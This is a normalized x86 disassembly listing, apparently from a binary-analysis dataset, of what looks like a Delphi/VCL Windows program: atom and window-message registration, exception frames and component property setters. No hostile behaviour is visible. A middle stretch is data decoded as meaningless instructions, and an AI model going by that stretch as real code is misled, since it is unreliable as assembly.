mov eax rw-data
call sub_403fc0
mov eax [ rw-data ]
call sub_40442c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40442c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413a54
mov [ rw-data ] eax
call sub_4424fc
mov dl 0x1
mov eax [ r-xdata ]
call sub_442324
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45469c
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455780
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_457368
mov ecx r-xdata
mov edx sub_434468
mov eax [ r-xdata ]
call sub_413208
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442a77
lea eax [ ebp - 0x10 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_442ae0
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442b46
retn
mov eax rw-data
call sub_40cbf8
call sub_442870
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4049e8
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_403f6c
sub_442b48
push ebp
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442bd5
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4428f8
mov eax [ r-xdata ]
call sub_41307c
mov eax [ r-xdata ]
call sub_41311c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130c8
sub_442e1c
stc
push ebx
push eax
dec eax
xor eax 0x36100044
inc esp
add [ eax + edi ] dl
inc esp
add [ eax + edi ] dh
inc esp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x78446eea
xor eax 0x3ec80044
inc ecx
add [ eax - 0x6b ] bl
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
inc esp
inc esp
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x42580006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
js r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
xor [ eax + eax + 0x30 ] al
add [ eax ] al
add ah dh
sbb [ ecx ] al
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x2c447076
dec esi
inc ecx
add al cl
inc ecx
add [ eax ] al
inc ebx
inc ecx
add al bh
inc ecx
inc ecx
add ah dl
push eax
inc ecx
add [ eax ] cl
push ecx
inc ecx
add [ ecx + edx * 2 ] cl
inc ecx
add [ eax ] dl
push ecx
inc ecx
add ah ah
inc ebp
inc ecx
add [ edx + edx * 2 + 0x52e00041 ] al
inc ecx
add [ ebx + edx * 2 + 0x4ca40041 ] dh
inc ecx
add al dh
push ebx
inc ecx
add [ esp + edx * 2 + 0x41 ] ah
add [ eax + eax * 2 + 0x44 ] ah
add [ esi + ecx * 2 + 0x41400041 ] dl
inc ecx
add [ eax ] dh
dec edi
inc ecx
add [ eax + 0x4f ] dh
inc ecx
add ah bl
dec edi
inc ecx
add [ eax + 0x6c004145 ] dl
push ecx
inc ecx
add [ eax + 0x6c004147 ] bl
dec eax
inc ecx
add [ eax - 0x47ffbeaf ] ch
push ecx
inc ecx
add al dl
dec eax
inc ecx
add [ ecx + ecx * 2 ] ah
inc ecx
add al dl
dec ecx
inc ecx
add [ eax + 0x4b ] ch
inc ecx
add al al
dec ebx
inc ecx
add [ esp + ecx * 2 + 0x41 ] dl
add al bh
dec esi
inc ecx
add [ edi + ecx * 2 ] dl
inc ecx
add [ edx + edx * 2 ] cl
inc ecx
add [ eax + edx * 2 + 0x41 ] bl
add [ esp + edx * 2 ] bl
inc ecx
add [ esp + edx * 2 ] ch
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
arpl [ ebp + 0x74 ] si
push esp
cmovno eax [ eax ]
pushad
add [ eax ] al
jmp [ eax ]
sub al 0x44
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
cld
inc ebx
push 0x65676e61
cld
sub eax 0x580044
add bh bh
push esp
cmp [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
push esp
cmovno eax [ eax ]
inc eax
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or [ edi + 0x6e ] cl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 + 0x350c0041 ] al
inc esp
add [ eax ] ah
aaa
inc esp
add [ esi + esi + 0x44 ] bl
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add ah ah
cmp eax 0x96300041
inc ecx
add [ esi + esi - 0x69bfffbc ] bl
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or [ edx ] ah
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x2ebc0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
inc esp
add [ eax ] ch
add [ eax ] al
xchg esp eax
sub eax 0x99640044
inc ecx
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
add al ch
xor [ eax ] eax
inc eax
inc ebx
jne r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
xchg ebp eax
inc ecx
add ah ah
cmp eax 0x96300041
inc ecx
inc eax
add [ eax + 0x3a ] al
inc esp
add [ eax + 0x5800443a ] dl
dec esp
imul esi [ ebx + 0x74 ] 0x30f4c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] al
add al [ eax ]
out dx al
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 + 0x39ec0041 ] al
inc esp
add [ eax - 0x64 ] ah
inc ecx
add [ esp + ebx * 4 ] al
inc ecx
add [ eax - 0x37ffbe65 ] bl
fwait
inc ecx
add [ ebx + ebx * 4 + 0x34b40041 ] bl
inc esp
add [ ebp + edi + 0x3d1c0044 ] al
inc esp
add [ eax + 0x40 ] bl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
xor [ esi - 0x645fffbf ] dl
inc ecx
add [ eax + 0x33 ] ah
inc esp
add [ edi + edi + 0x44 ] bl
inc ebx
jne r-xdata
add [ eax + 0x6000419b ] ah
xor eax [ eax + eax + 0x5c ]
aas
inc esp
cmp al [ eax + eax - 0x70 ]
cmp al [ eax + eax + 0x58 ]
dec esp
imul esi [ ebx + 0x74 ] r-xdata
in al 0x19
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x31640000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3ffbbcf ] bh
xor [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
xor [ eax + eax - 0x18 ] eax
xor [ eax + eax - 0x60 ] eax
add [ eax ] al
add al bl
sub eax [ eax + eax + 0x64 ]
cdq
inc ecx
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x40447192
sub_4432f0
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419b40
test bl bl
jle r-xdata
mov edx esi
call sub_443704
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_443360
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419640
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_443408
sub_443394
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443324
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413730
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_4138bc
sub_4433dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404378
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403fc0
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_443408
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_443704
mov edx ebx
mov eax esi
call sub_4436e4
sub_443430
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_443408
sub_44345c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4580e4
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403430
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419bcc
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_434294
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4434b4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45810c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403430
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_419be8
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_434294
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44350c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4191e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_443690
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_443578
push ebx
push esi
push edi
call sub_4035a8
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403234
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_413928
call sub_403234
mov eax [ edi + 0x30 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41922c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403590
sub_4435c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_443610
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41389c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov edx edi
call sub_443394
sub_44365c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_444f00
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_444f44
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_4192b0
sub_44369c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4194fc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_443704
sub_4436e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4136e4
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_4192b0
pop esi
pop ebx
retn
sub_443704
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413984
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_443720
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_443788
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_44dfbc
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44679c
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_444030
mov edx ebp
call sub_444090
inc eax
je r-xdata
sub_443814
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_443834
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_443854
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_443ca4
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_443ca4
sub_4439ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419afc
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_443a40
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403234
mov eax [ esi + 0x9c ]
call sub_403234
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4432f0
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cbf8
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_443a90
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413ec8
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_443b3c
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_443b9c
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_443ca4
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_443ddc
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_443e3c
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_443e98
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_443efc
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_443b3c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404378
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_443b9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_443654
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_443640
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_443b9c
sub_443ca4
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_443d1c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404378
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413840
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413840
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
sub_443d84
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_443ddc
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404378
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403fc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_443e3c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_4033e4
test eax eax
je r-xdata
sub_443e98
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
